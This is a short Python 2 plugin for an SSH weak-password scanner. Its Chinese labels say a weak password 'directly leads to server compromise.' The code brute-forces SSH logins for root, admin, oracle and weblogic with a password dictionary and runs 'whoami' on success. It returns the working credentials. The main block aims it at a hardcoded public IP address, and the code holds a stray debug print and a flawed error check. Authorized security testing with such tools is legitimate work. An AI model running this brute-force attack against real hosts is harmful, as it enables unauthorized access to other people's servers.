#-*- coding: UTF-8 -*- 

import paramiko
import Config

paramiko.util.logging.getLogger('paramiko.transport').addHandler(paramiko.util.logging.NullHandler())

def get_plugin_info():
    plugin_info = {
        "name": "SSH弱口令",
        "info": "直接导致服务器被入侵控制。",
        "exp_url": "",
        "docker": "",
        "other": ""
    }
    return plugin_info


def check(ip, port, timeout):
    user_list = ['root', 'admin', 'oracle', 'weblogic']
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    PASSWORD_DIC = Config.PASSWORD_DIC_DIR
    print("asfasf")
    for user in user_list:
        for pass_ in PASSWORD_DIC:
            pass_ = str(pass_.replace('{user}', user))
            try:
                ssh.connect(ip, port, user, pass_, timeout=timeout, allow_agent = False, look_for_keys = False)
                ssh.exec_command('whoami',timeout=timeout)
                if pass_ == '': pass_ = "null"
                return u"存在弱口令，账号：%s，密码：%s" % (user, pass_)
            except Exception, e:
                if "Unable to connect" in e or "timed out" in e: return
            finally:
                ssh.close()

if __name__ == "__main__":
    print(check("118.89.47.92",22,2000))